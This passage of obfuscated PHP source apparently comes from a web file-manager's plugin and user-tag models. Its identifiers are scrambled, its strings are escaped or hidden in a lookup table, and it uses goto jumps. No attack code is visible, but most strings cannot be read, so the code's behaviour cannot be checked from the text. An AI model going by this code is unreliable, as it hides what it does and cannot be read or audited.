(!$this->getByTagID($úÛ¼ş½, $º³ÁäÅ)) { return !1; } $«¬®ı€å = array($”·®Öí[1654] => 0, $”·®Öí[492] => $º³ÁäÅ, $”·®Öí[431] => $”·®Öí[1971] . $úÛ¼ş½); return $this->where($«¬®ı€å)->delete(); } protected function removeBySource($ğÄëÃó, $ç³àŸÂ‰) { $Îßš÷±ï =& $_SERVER[Å¶¨Şêº]; if (!$ğÄëÃó || !$ç³àŸÂ‰) { return !1; } if (is_array($ç³àŸÂ‰)) { $ç³àŸÂ‰ = array($Îßš÷±ï[7], $ç³àŸÂ‰); } $‰ğíÓ³Ü = array($Îßš÷±ï[1654] => 0, $Îßš÷±ï[430] => $ç³àŸÂ‰, $Îßš÷±ï[492] => array($Îßš÷±ï[1011], 0), $Îßš÷±ï[431] => $Îßš÷±ï[1971] . $ğÄëÃó); return $this->where($‰ğíÓ³Ü)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\155\x2e\160\154\x75\147\x69\156\x4c\151\x73\x74"; public $field = array("\x6e\141\155\x65", "\x73\x74\x61\x74\x75\x73", "\162\145\147\x69\145\163\x74", "\143\157\x6e\146\x69\147"); public function loadList($ê¼æ¹û¯ = false) { $œÉŸí“Œ = array_to_keyvalue($this->listData(), $_SERVER[Å¶¨Şêº][42]); if ($ê¼æ¹û¯) { return $œÉŸí“Œ[$ê¼æ¹û¯]; } return $œÉŸí“Œ; } public function init() { $‰™¾¸ Œ =& $_SERVER[Å¶¨Şêº]; Hook::trigger($‰™¾¸ Œ[1972]); $¡ñ„Ò„® = $this->loadPluginList(); foreach ($¡ñ„Ò„® as $®öÜÌ– => $ßàúÍÙÃ) { $¹»‡Í¹ = $this->appAllow($®öÜÌ–, $ßàúÍÙÃ); if (!$¹»‡Í¹) { continue; } foreach ($ßàúÍÙÃ[$‰™¾¸ Œ[1973]] as $óöí½ªœ => $²›·£¹”) { Hook::bind($óöí½ªœ, $²›·£¹”); } } Hook::trigger($‰™¾¸ Œ[1974]); Hook::trigger(ACTION); } public function appAllow($Ó¤ò¤ªæ, $«Àä½, $Äµş¤Ó¤ = true) { $İèÔßÖ =& $_SERVER[Å¶¨Şêº]; $å¿—ËõÚ = PLUGIN_DIR . $Ó¤ò¤ªæ . $İèÔßÖ[1975]; if (!is_array($«Àä½) || !is_array($«Àä½[$İèÔßÖ[1973]]) || $«Àä½[$İèÔßÖ[747]] != 1 || !is_file($å¿—ËõÚ)) { return !1; } if ($GLOBALS[$İèÔßÖ[503]] == 1) { if ($GLOBALS[$İèÔßÖ[6]][$İèÔßÖ[1976]] || !$GLOBALS[$İèÔßÖ[6]][$İèÔßÖ[1977]]) { return !0; } $ Êş…´ = explode($İèÔßÖ[60], strtolower($GLOBALS[$İèÔßÖ[6]][$İèÔßÖ[1977]])); return in_array(strtolower($Ó¤ò¤ªæ), $ Êş…´) ? !1 : !0; } if ($Äµş¤Ó¤ && !Action($İèÔßÖ[1978])->checkAuth($Ó¤ò¤ªæ)) { return !1; } return !0; } public function unInstall($ÄÎ°ñ) { $Õ¬¤ê´º =& $_SERVER[Å¶¨Şêº]; $ğ¸ìíˆ = $this->loadList($ÄÎ°ñ); if (file_exists(PLUGIN_DIR . $ÄÎ°ñ)) { Hook::apply($ÄÎ°ñ . $Õ¬¤ê´º[1979]); } $this->remove($ğ¸ìíˆ[$Õ¬¤ê´º[408]]); } public function changeStatus($Åî¿Öşß, $Ì¿¼û­¦) { $’†¡¹ã¾ =& $_SERVER[Å¶¨Şêº]; $ Õ½²ù = $this->loadList($Åî¿Öşß); if ($Ì¿¼û­¦) { Hook::apply($Åî¿Öşß . $’†¡¹ã¾[1980]); } $this->update($ Õ½²ù[$’†¡¹ã¾[408]], array($’†¡¹ã¾[1981] => $Ì¿¼û­¦)); } public function appRegist($ğøåíãÀ, $úåï€‚É) { $ª–‰’…ı =& $_SERVER[Å¶¨Şêº]; $•€À¸ãÕ = $this->loadList($ğøåíãÀ); if ($•€À¸ãÕ) { $this->update($•€À¸ãÕ[$ª–‰’…ı[408]], array($ª–‰’…ı[1973] => $úåï€‚É)); } else { $Ä¥´Õ¦ = array($ª–‰’…ı[42] => $ğøåíãÀ, $ª–‰’…ı[1973] => $úåï€‚É, $ª–‰’…ı[747] => 0, $ª–‰’…ı[6] => $this->getConfigDefault($ğøåíãÀ)); $this->insert($Ä¥´Õ¦); } } public function getConfigDefault($ĞğóÎäæ) { $ıÃÖª‡Ò =& $_SERVER[Å¶¨Şêº]; $¼É®Ç÷Ê = array(); $½‹•Ï†í = $this->getPackageJson($ĞğóÎäæ); if (!$½‹•Ï†í && is_array($½‹•Ï†í[$ıÃÖª‡Ò[1982]])) { return $¼É®Ç÷Ê; } foreach ($½‹•Ï†í[$ıÃÖª‡Ò[1982]] as $ô›¶¡· => $Ø”¿Åô) { if (!isset($Ø”¿Åô[$ıÃÖª‡Ò[384]]) || isset($¼É®Ç÷Ê[$ô›¶¡·])) { continue; } $¼É®Ç÷Ê[$ô›¶¡·] = $Ø”¿Åô[$ıÃÖª‡Ò[384]]; } return $¼É®Ç÷Ê; } public function getPackageJson($î¿õø©Ñ) { return Hook::apply($î¿õø©Ñ . $_SERVER[Å¶¨Şêº][1983]); } public function getConfig($—§„Öøã, $Í™Á†¯ = false) { $Äì˜»¼Ù =& $_SERVER[Å¶¨Şêº]; $½¨µÓ÷ı = array(); $¡×˜½Üı = $this->loadList($—§„Öøã); if ($¡×˜½Üı && is_array($¡×˜½Üı[$Äì˜»¼Ù[6]])) { $½¨µÓ÷ı = $¡×˜½Üı[$Äì˜»¼Ù[6]]; } if (!$½¨µÓ÷ı || $Í™Á†¯) { $½¨µÓ÷ı = $this->getConfigDefault($—§„Öøã); } return $½¨µÓ÷ı; } public function setConfig($ä£ïíÚ³, $—¬µ¨ÌÎ = false) { $™ë‹ë½à =& $_SERVER[Å¶¨Şêº]; $ğ¼ßïû© = $this->loadList($ä£ïíÚ³); if (!$ğ¼ßïû©) { return !1; } $ˆ÷¹ÔÏù = $ğ¼ßïû©[$™ë‹ë½à[6]]; if ($—¬µ¨ÌÎ == !1) { $ˆ÷¹ÔÏù = array(); $—¬µ¨ÌÎ = $this->getConfigDefault($ä£ïíÚ³); } foreach ($—¬µ¨ÌÎ as $Ò€ö·Ğ‰ => $²ı€¼®á) { $ˆ÷¹ÔÏù[$Ò€ö·Ğ‰] = is_string($²ı€¼®á) ? trim($²ı€¼®á) : $²ı€¼®á; } $this->update($ğ¼ßïû©[$™ë‹ë½à[408]], array($™ë‹ë½à[6] => $ˆ÷¹ÔÏù)); } public function viewList() { $Èé’¡å =& $_SERVER[Å¶¨Şêº]; $ˆ¿¯†ë = $this->loadList(); $this->pluginScan($ˆ¿¯†ë); $ˆ¿¯†ë = $this->loadPluginList(); $Ø’ñ¹¢ì = array(); foreach ($ˆ¿¯†ë as $¬ÎÇËîü => $éÁÜƒÁ) { unset($éÁÜƒÁ[$Èé’¡å[1973]], $éÁÜƒÁ[$Èé’¡å[6]]); $ÎÎÁì¢£ = PLUGIN_DIR . $éÁÜƒÁ[$Èé’¡å[42]] . $Èé’¡å[1975]; if (!is_file($ÎÎÁì¢£)) { continue; } $†ÉääÙ• = Hook::apply($éÁÜƒÁ[$Èé’¡å[42]] . $Èé’¡å[1983]); if (is_array($†ÉääÙ•)) { $Ø’ñ¹¢ì[$¬ÎÇËîü] = array_merge($éÁÜƒÁ, $†ÉääÙ•); } } return $Ø’ñ¹¢ì; } private function loadPluginList() { $Ï¢Ÿ€•÷ =& $_SERVER[Å¶¨Şêº]; $š´Ş¤Æ÷ = $this->loadList(); if (strtolower(MOD) == $Ï¢Ÿ€•÷[1984]) { return $š´Ş¤Æ÷; } $Ê”çßöÔ = Hook::trigger($Ï¢Ÿ€•÷[1985], $š´Ş¤Æ÷); if ($š´Ş¤Æ÷ && !$Ê”çßöÔ) { die; } return $Ê”çßöÔ ? $Ê”çßöÔ : $š´Ş¤Æ÷; } private function pluginScan($ü€¤ëä) { $ÔßÂ şª =& $_SERVER[Å¶¨Şêº]; recursion_dir(PLUGIN_DIR, $ Ô’Åª, $ÄŞ››úÊ, 0); foreach ($ Ô’Åª as $µ©Äö’Ş) { $¡‹ùğ…× = get_path_this($µ©Äö’Ş); if (isset($ü€¤ëä[$¡‹ùğ…×]) || !file_exists($µ©Äö’Ş . $ÔßÂ şª[1986]) || !file_exists($µ©Äö’Ş . $ÔßÂ şª[1975])) { continue; } Hook::apply($¡‹ùğ…× . $ÔßÂ şª[1980]); } } } goto cã§¨ŞšÂƒ; b±‡ùÁà’: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\x72\137\x66\141\x76"; protected function cacheFunctionAlias($¨Ï«âİñ) { $êæ€º‰ç =& $_SERVER[Å¶¨Şêº]; return array($êæ€º‰ç[1963] => array($êæ€º‰ç[2347] . USER_ID, $êæ€º‰ç[1964])); } protected function listData() { $‘›¬Úî‹ =& $_SERVER[Å¶¨Şêº]; $÷º¾Àè = array($‘›¬Úî‹[1654] => USER_ID, $‘›¬Úî‹[492] => array($‘›¬Úî‹[1967], 0)); $Úä—Â£© = $‘›¬Úî‹[2348]; $Ğ“ŠéÕ = $this->field($Úä—Â£©)->where($÷º¾Àè)->order($‘›¬Úî‹[1970])->select(); return $Ğ“ŠéÕ ? $Ğ“ŠéÕ : array(); } protected function addToTag($¬öíÄùë, $¿ç‰¢çâ) { $·Ûõ³ù· =& $_SERVER[Å¶¨Şêº]; if (!Model($·Ûõ³ù·[2111])->listData($¿ç‰¢çâ)) { return !1; } if (is_numeric($¬öíÄùë)) { $†ÃÈ†æ = Model($·Ûõ³ù·[823])->pathInfo($¬öíÄùë); if (!$†ÃÈ†æ) { return !1; } } else { $†ÃÈ†æ = IO::infoSimple($¬öíÄùë); if (!$†ÃÈ†æ) { return !1; } $Á±ïì¨ï = $†ÃÈ†æ[$·Ûõ³ù·[42]]; $¤ú±“ğ¥ = $†ÃÈ†æ[$·Ûõ³ù·[43]]; if (isset($†ÃÈ†æ[$·Ûõ³ù·[419]])) { $¤ú±“ğ¥ = $†ÃÈ†æ[$·Ûõ³ù·[419]] == $·Ûõ³ù·[99] ? $·Ûõ³ù·[86] : $·Ûõ³ù·[211]; } } $åŠ‰ÖĞ¥ = array($·Ûõ³ù·[1654] => USER_ID, $·Ûõ³ù·[492] => $¿ç‰¢çâ, $·Ûõ³ù·[430] => $¬öíÄùë, $·Ûõ³ù·[431] => $¤ú±“ğ¥ ? $¤ú±“ğ¥ : $·Ûõ³ù·[425], $·Ûõ³ù·[429] => $Á±ïì¨ï ? $Á±ïì¨ï : $·Ûõ³ù·[12], $·Ûõ³ù·[1856] => 0); if ($this->where($åŠ‰ÖĞ¥)->find()) { return !1; } return $this->add($åŠ‰ÖĞ¥); } protected function removeFromTag($›®ƒıã, $Ÿğ¼‡ïå) { $½Å–óö€ =& $_SERVER[Å¶¨Şêº]; if (!Model($½Å–óö€[2111])->listData($Ÿğ¼‡ïå)) { return !1; } if (is_array($›®ƒıã)) { $›®ƒıã = array($½Å–óö€[7], $›®ƒıã); } $·Ä±­ = array($½Å–óö€[1654] => USER_ID, $½Å–óö€[492] => $Ÿğ¼‡ïå, $½Å–óö€[430] => $›®ƒıã); return $this->where($·Ä±­)->delete(); } protected function removeByTag($Ê”æä©õ) { $¯Íà–À =& $_SERVER[Å¶¨Şêº]; if (!$Ê”æä©õ) { return !1; } $–åÕ¬Í“ = array($¯Íà–À[1654] => USER_ID, $¯Íà–À[492] => $Ê”æä©õ); return $this->where($–åÕ¬Í“)->delete(); } protected function removeBySource($•ÇìäÙ•) { $Éû±’›Ö =& $_SERVER[Å¶¨Şêº]; if (is_array($•ÇìäÙ•)) { $•ÇìäÙ• = array($Éû±’›Ö[7], $•ÇìäÙ•); } $Î’¼Åõ = array($Éû±’›Ö[1654] => USER_ID, $Éû±’›Ö[492] => array($Éû±’›Ö[1011], 0), $Éû±’›Ö[430] => $•ÇìäÙ•); return $this->where($Î’¼Åõ)->delete(); } }